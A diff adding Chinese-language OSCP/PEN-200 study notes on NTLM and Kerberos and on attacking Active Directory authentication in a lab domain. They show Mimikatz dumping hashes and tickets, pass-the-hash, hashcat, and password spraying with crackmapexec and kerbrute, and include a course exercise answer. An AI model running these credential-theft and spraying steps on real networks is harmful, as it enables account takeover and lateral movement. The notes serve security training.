@@ -1440,3 +1440,438 @@ PS C:\Users\stephanie\Desktop>
 >4. 擁有者（Owner） 欄位會顯示目前擁有該群組控制權的使用者。
 
 # Attacking Active Directory Authentication
+首先探索 Active Directory (AD) 的身份驗證機制，了解 Windows caches authentication objects（例如密碼 hashes 和 tickets）的位置。接下來針對這些身分驗證機制的攻擊方法，來取得使用者憑證以及對系統和服務的存取權限。
+## Understanding Active Directory Authentication
+AD Authentication 包含：
+- Understand NTLM Authentication
+- Understand Kerberos Authentication
+- Become familiar with cached AD Credentials
+
+### NTLM Authentication
+在 [Password Attacks](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#ntlm-vs-net-ntlmv2) 中討論了什麼是 NTLM 以及在哪裡可以找到它的 Hash。在本節中，將在 Active Directory 環境中探討 NTLM 驗證。
+>[!Note]
+>NTLM 主要在無法使用 Kerberos 時才會被用來身份驗證，例如：
+>- 透過 IP 連線伺服器。
+>- 伺服器 未註冊在 AD DNS。
+>- 某些第三方應用仍然使用 NTLM。
+
+####  NTLM 驗證流程（7 個步驟）
+![image](https://hackmd.io/_uploads/H19MNKao1x.png)
+1. 計算 NTLM Hash
+使用者輸入密碼後，電腦會將其轉換為 NTLM Hash。
+2. 用戶端傳送使用者名稱至伺服器
+伺服器不會收到密碼本身，而是先收到 Username。
+3. 伺服器產生隨機數（nonce/challenge）並回傳
+伺服器生成一個隨機挑戰值（nonce），並回傳給用戶端。
+4. 用戶端使用 NTLM Hash 加密 nonce 並傳送回伺服器
+這個 加密後的 nonce（稱為 response） 會被送回伺服器。
+5. 伺服器將 response、nonce 及 Username 傳送至 Domain Controller
+DC（Domain Controller）負責進一步驗證。
+6. DC 使用 NTLM Hash 加密 nonce 並比對 response
+DC 內建用戶 NTLM Hash，會使用該 Hash 加密 nonce，並與伺服器的 response 進行比對。
+7. 如果比對成功，則通過身份驗證
+如果兩者相符，驗證成功；否則，拒絕登入。
+
+>[!Tip]
+>NTLM 的安全性問題:
+>- 無法反向破解：
+>NTLM 是一種 `單向 Hash 算法`，無法直接從雜湊值逆推出原始密碼。
+>- 計算速度快，容易被破解：
+NTLM 缺乏 Salt，使其雜湊值對於相同的密碼來說都是固定的，暴力破解更容易。
+>>使用 Hashcat + 高效能 GPU，可以每秒測試 6000 億個 NTLM Hash\
+8 字元的密碼在 2.5 小時內破解\
+9 字元的密碼在 11 天內破解
+
+### Kerberos Authentication
+Kerberos 是一種 基於 Ticket 的認證協議，從 Windows Server 2003 開始採用為 Windows 的主要身份驗證機制\
+與 NTLM 直接與伺服器互動不同，Kerberos 的認證流程 需要透過 Domain Controller 作為 金鑰發放中心（[Key Distribution Center](https://en.wikipedia.org/wiki/Key_distribution_center), KDC） 來管理身份驗證。
+#### Kerberos 認證流程
+Kerberos 的認證包含 三個主要階段，涉及 四個請求回應（`AS-REQ` / `AS-REP` / `TGS-REQ` / `TGS-REP`）和最終的 應用程式請求（`AP-REQ`）。
+![image](https://hackmd.io/_uploads/rkOIaYajkx.png)
+
+##### 第一階段：身份驗證請求（AS-REQ / AS-REP）
+1. 用戶登入後，發送 AS-REQ（Authentication Server Request）
+當用戶在 workstation 上輸入密碼，系統會計算密碼的 `NTLM Hash` 並使用這個 Hash 加密一個 `timestamp`。這個請求會發送到 DC，並由 KDC 的驗證伺服器（AS, Authentication Server）處理。
+
+2. KDC 驗證用戶並回應 AS-REP（Authentication Server Reply）
+DC 會從 [ntds.dit](https://attack.mitre.org/techniques/T1003/003/) 文件中檢索用戶的 NTLM Hash，並嘗試解密 timestamp。\
+如果解密成功，並且 timestamp 不是重複的（避免 potential replay attack），則身份驗證成功。\
+DC 會返回 一張「`Ticket Granting Ticket` (TGT)」和「`Session Key`」 給用戶：
+>`TGT` 是用 [KRBTGT](https://adsecurity.org/?p=483) 帳戶的 NTLM Hash 加密的，因此只有 DC 能夠解密。\
+>`Session Key` 用戶可以使用，並在後續步驟中使用 TGT 來請求服務存取。
+>>TGT 預設有效期為 10 小時，之後可自動續約，不需要重新輸入密碼。
+
+##### 第二階段：獲取服務存取權（TGS-REQ / TGS-REP）
+3. 用戶發送 TGS-REQ（Ticket Granting Service Request）
+當用戶要存取特定的 AD 服務（例如 network share 或 mailbox），它會：\
+使用 Session Key 加密 `TGT` 和 `timestamp`，並請求特定服務的存取權。
+4. KDC 回應 TGS-REP（Ticket Granting Service Reply）
+DC 會解密 TGT 來驗證身份，並檢查請求的資源是否存在。\
+如果成功，DC 會提供一張 `Service Ticket`：
+包含 username、group memberships 資格和新的 Session Key。
+> Service Ticket 是用該服務的帳戶密碼 Hash 加密的，因此只有該服務能夠解密。
+
+##### 第三階段：服務驗證（AP-REQ）
+5. 用戶發送 AP-REQ（Application Request）給應用伺服器
+用戶向 Application server（如 file share、SQL Server）提交請求，包含：\
+(1)Session Key 加密的 `username` 和 `timestamp`\
+(2)加密的 `Service Ticket`。
+6. 應用伺服器驗證請求
+伺服器 使用自己的 NTLM Hash 解密 Service Ticket，獲取用戶資訊與 Session Key。\
+比對 AP-REQ 的 `username` 與 `Service Ticket 中的 username`。
+如果匹配，則授權用戶存取該應用程式或資源。
+
+#### NTLM vs. Kerberos 認證比較
+- | NTLM | Kerberos |
+:------:|:---------------------|:---------------------|
+身份驗證方式| Challenge-Response | Ticket-based
+密碼傳輸 | 直接使用 NTLM Hash | 使用 TGT 和 Service Ticket
+安全性 | 脆弱，易受 Hash 攻擊 | 更安全，避免密碼傳輸
+適用場景 | 單獨伺服器或無法使用 Kerberos 的情況| AD 環境，預設身份驗證方式
+
+### Cached AD Credentials
+AD 的 Cached Credentials，並利用 Mimikatz 提取 Windows 記憶體中的密碼 Hash 與 Kerberos Ticket，進而進行攻擊或 Lateral Movement\
+####  AD 快取密碼
+在 Windows 網域環境 中，Kerberos 認證機制透過 Single Sign-On (SSO) 讓 user 不需要反覆輸入密碼。然而為了讓 TGT（Ticket Granting Ticket） 可以在有效期內自動續約，Windows 需要 快取使用者的密碼雜湊，而這些資訊會儲存在 LSASS（[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)）process 的記憶體內。
+
+如果能夠 存取 LSASS 記憶體，就可以取得 `NTLM Hash` 或 `Kerberos Ticket` 來執行進一步的攻擊。
+
+#### 1. Mimikatz 提取密碼雜湊
+##### 1.1 RDP 連線並啟用 Mimikatz
+jeff domain user 是 CLIENT75 的 local administrator，所以可以在本機提權
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.208.75
+```
+(Powershell): Run as Administrator
+```
+PS C:\Windows\system32> cd C:\Tools\
+PS C:\Tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+```
+> 啟用 SeDebugPrivilege 權限，讓 Mimikatz 具備存取 LSASS 記憶體 的權限。
+
+##### 1.2 提取所有已登入使用者的密碼雜湊
+```
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 4876838 (00000000:004a6a26)
+Session           : RemoteInteractive from 2
+User Name         : jeff
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 9/9/2022 12:32:11 PM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1105
+        msv :
+         [00000003] Primary
+         * Username : jeff
+         * Domain   : CORP
+         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
+         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
+         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
+        tspkg :
+        wdigest :
+         * Username : jeff
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : jeff
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+...
+Authentication Id : 0 ; 122474 (00000000:0001de6a)
+Session           : Service from 0
+User Name         : dave
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 9/9/2022 1:32:23 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+        msv :
+         [00000003] Primary
+         * Username : dave
+         * Domain   : CORP
+         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
+         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
+         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
+        tspkg :
+        wdigest :
+         * Username : dave
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : dave
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+...
+```
+> jeff:
+> - NTLM Hash = `2688c6d2af5e9c7ddb268899123744ea`
+> - SHA1 Hash = `f57d987a25f39a2887d158e8d5ac41bc8971352f`
+>
+> dave:
+> - NTLM Hash = `08d7a47a6f9f66b97b1bae4178747494`
+> - SHA1 Hash = `a0c2285bfad20cc614e2d361d6246579843557cd`
+
+>[!Tip]
+>對於 Windows 2003 的 AD instances，NTLM 是唯一可用的雜湊演算法。🥚 對於執行 Windows Server 2008 或更高版本的實例，`NTLM` 和 `SHA-1` 可能都可用。\
+>在 Windows 7 等較舊的作業系統或手動設定的作業系統上，`WDigest 11`會處於啟用狀態。啟用 WDigest 時，執行 Mimikatz 會顯示明文密碼以及密碼雜湊值。
+
+#### - 利用 NTLM Hash
+可參考 Password Attacks 章節
+- Offline Cracking
+```
+┌──(chw㉿CHW)-[~]
+└─$ hashcat -m 1000 jeff.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+- pass-the-hash (PtH)
+```
+mimikatz # sekurlsa::pth /user:jeff /domain:corp.com /ntlm:2688c6d2af5e9c7ddb268899123744ea /run:powershell.exe
+```
+
+#### 2. Mimikatz 提取 Kerberos Ticket
+##### 2.1 訪問共享資料夾，觸發 Kerberos Ticket 存儲
+WEB04 上 UNC 路徑為\\web04.corp.com\backup 的SMB 共享的內容
+```
+PS C:\Users\jeff> dir \\web04.corp.com\backup
+
+
+    Directory: \\web04.corp.com\backup
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
+```
+> 讓系統產生一個 TGS（Service Ticket），並快取於 LSASS
+##### 2.2 用 Mimikatz 提取 Kerberos Ticket
+使用 Mimikatz 透過 `sekurlsa::tickets` 顯示儲存在記憶體中的 Ticket
+```
+mimikatz # sekurlsa::tickets
+
+Authentication Id : 0 ; 656588 (00000000:000a04cc)
+Session           : RemoteInteractive from 2
+User Name         : jeff
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 9/13/2022 2:43:31 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1105
+
+         * Username : jeff
+         * Domain   : CORP.COM
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+         [00000000]
+           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
+           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
+           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
+           Client Name  (01) : jeff ; @ CORP.COM
+           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000001 - des_cbc_crc
+             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
+         [00000001]
+           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
+           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
+           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
+           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000001 - des_cbc_crc
+             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
+           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
+           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000001 - des_cbc_crc
+             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+...
+```
+> 表示 jeff 在 web04.corp.com 伺服器上有一張存取權限的 Kerberos 票據。\
+透過這張 ticket ，攻擊者可以 冒充 jeff，進行 SMB 存取或其他操作(如 Pass-The-Ticket)
+
+>[!Important]
+**如何利用 ticket 進行攻擊**
+>1. 竊取 TGS：
+>- 只允許存取特定的服務。
+>- Pass-the-Ticket（PTT）攻擊：直接使用竊取的 TGS 來存取受保護資源。
+>2. 竊取 TGT：
+>- 允許攻擊者偽裝成目標使用者，請求新的 TGS 來存取 任意資源。
+>- Golden Ticket 攻擊：偽造 TGT 來完全掌控 AD 網域。
+>3. Mimikatz 票據提取與注入：
+>- Export：將 TGT/TGS ticket 存儲到硬碟。
+>- Inject：將 TGT/TGS 重新導入 LSASS 記憶體，從而在目標機器上模擬受害者身份。
+
+## Performing Attacks on Active Directory Authentication
+介紹針對 Active Directory（AD）身份驗證 的各種攻擊方法
+### Password Attacks (Password Spraying)
+在 AD 環境中，過於頻繁的密碼錯誤輸入可能會導致帳戶鎖定，引起系統管理員的警覺。因此，需要使用密碼噴灑攻擊來測試大量帳戶，使用少量常見密碼來嘗試登入，而不是對單一帳戶進行暴力破解。\
+可以從 `net accounts` 取得的資訊:
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.151.75
+```
+```
+PS C:\Windows\system32> net accounts
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          1
+Maximum password age (days):                          42
+Minimum password length:                              7
+Length of password history maintained:                24
+Lockout threshold:                                    5
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        WORKSTATION
+The command completed successfully.
+```
+> `Lockout threshold`：連續 5 次錯誤輸入密碼，會導致帳戶鎖定\
+`Lockout duration`：30 分鐘後解除鎖定\
+`Lockout observation window`：30 分鐘內錯誤超過 5 次才會觸發鎖定\
+>>表示可以每 30 分鐘內嘗試 4 次錯誤密碼輸入\
+>>可以在 24 小時內對每個網域使用者嘗試 192 次登錄
+
+#### 1. 使用 LDAP 和 ADSI（低速、隱蔽）
+透過 LDAP 協議與 ADSI（Active Directory Service Interfaces） 進行身份驗證。低速但較隱蔽，不會產生大量網路流量。\
+在 [Active Directory - Manual Enumeration](#Adding-Search-Functionality-to-our-Script) 章節中，使用 DirectoryEntry 對 Domain controller 進行查詢\
+透過 DirectoryEntry  Object 來測試帳戶密碼是否正確：
+```
+PS C:\Windows\system32> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+PS C:\Windows\system32> $PDC = ($domainObj.PdcRoleOwner).Name
+PS C:\Windows\system32> $SearchString = "LDAP://"
+PS C:\Windows\system32> $SearchString += $PDC + "/"
+PS C:\Windows\system32> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+PS C:\Windows\system32> $SearchString += $DistinguishedName
+PS C:\Windows\system32> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+
+distinguishedName : {DC=corp,DC=com}
+Path              : LDAP://DC1.corp.com/DC=corp,DC=com
+```
+>`GetCurrentDomain()`：取得當前 Windows 設備所屬的 AD 網域資訊\
+>`PdcRoleOwner`：取得 Primary Domain Controller (PDC) 的名稱\
+>`LDAP://$PDC/DC=corp,DC=com`: 組合 LDAP 路徑\
+>創建 System.DirectoryServices.DirectoryEntry：\
+`$SearchString`：LDAP 路徑，指定要查詢的 AD 網域。
+"pete"：測試登入的 AD 使用者名稱。
+"Nexus123!"：測試用的密碼。
+>> object 建立，代表密碼正確
+
+若密碼不正確，會顯示 password incorrect\
+![image](https://hackmd.io/_uploads/SyaC9yAo1g.png)
+
+#### 撰寫腳本
+可以使用現成的 [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
+```
+PS C:\Tools> powershell -ep bypass
+PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+WARNING: also targeting admin accounts.
+Performing brute force - press [q] to stop the process and print results...
+Guessed password for user: 'pete' = 'Nexus123!'
+Guessed password for user: 'jen' = 'Nexus123!'
+Users guessed are:
+ 'pete' with password: 'Nexus123!'
+ 'jen' with password: 'Nexus123!'
+```
+> 提供了兩組有效的憑證，密碼為 `Nexus123！`
+
+#### 2. 使用 SMB（傳統方法、較為顯眼）
+透過 SMB（Server Message Block）協議驗證帳戶，每次嘗試都會建立完整的 SMB 連線，因此網路流量較大。\
+使用 [crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec) 工具（Kali Linux）：
+```
+┌──(chw㉿CHW)-[~]
+└─$ cat users.txt                                       
+dave
+jen
+pete
+
+┌──(chw㉿CHW)-[~]
+└─$ crackmapexec smb 192.168.151.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+SMB         192.168.151.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.151.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
+SMB         192.168.151.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
+SMB         192.168.151.75  445    CLIENT75         [-] corp.com\pete:Nexus123! STATUS_ACCOUNT_LOCKED_OUT 
+
+```
+> `-d corp.com`: 設定目標 AD Domain\
+`--continue-on-success`: 讓工具在找到有效帳戶後繼續測試
+
+crackmapexec 在開始 password spraying 之前不會檢查網域的密碼策略。因此，我們應該謹慎使用這種方法鎖定使用者帳戶
+
+假設 dave 是 CLIENT75 上的本機管理員。讓我們使用 crackmapexec 和密碼 Flowers1 來瞄準這台機器
+```
+┌──(chw㉿CHW)-[~]
+└─$ crackmapexec smb 192.168.151.75 -u dave -p 'Flowers1' -d corp.com
+SMB         192.168.151.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.151.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
+```
+> `Pwn3d!` 表示擁有本機管理員權限
+
+#### 3. 使用 Kerberos（最快速、低噪音）
+基於取得 TGT。
+Kerberos 驗證只需要發送 兩個 UDP frames（AS-REQ），比起 LDAP 和 SMB 方法更快、更安靜。\
+使用 [kerbrute](https://github.com/ropnop/kerbrute) 工具（Windows 版）：
+```
+PS C:\Tools> type .\users.txt
+pete
+dave
+jen
+
+PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\users.txt "Nexus123!"
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 03/11/25 - Ronnie Flathers @ropnop
+
+2025/03/11 10:41:59 >  Using KDC(s):
+2025/03/11 10:41:59 >   dc1.corp.com:88
+2025/03/11 10:41:59 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
+2025/03/11 10:41:59 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
+2025/03/11 10:41:59 >  Done! Tested 3 logins (2 successes) in 0.053 seconds
+```
+
+>[!Note]
+>Q: Spray the credentials of pete against all domain joined machines with crackmapexec. On which machine is pete a local administrator?\
+>Ans:
+>```
+>┌──(chw㉿CHW)-[~]
+>└─$ crackmapexec smb 192.168.151.0/24 -u pete -p 'Nexus123!' -d corp.com
+>SMB         192.168.151.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+>SMB         192.168.151.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
+>SMB         192.168.151.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
+>SMB         192.168.151.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
+>SMB         192.168.151.76  445    CLIENT76         [*] Windows 10 / Server 2016 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
+>SMB         192.168.151.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
+>SMB         192.168.151.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
+>SMB         192.168.151.72  445    WEB04            [+] corp.com\pete:Nexus123! 
+>SMB         192.168.151.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 
+>SMB         192.168.151.73  445    FILES04          [+] corp.com\pete:Nexus123! 
+>SMB         192.168.151.76  445    CLIENT76         [+] corp.com\pete:Nexus123! (Pwn3d!)
+>SMB         192.168.151.70  445    DC1              [+] corp.com\pete:Nexus123!
+>```
+
+### AS-REP Roasting
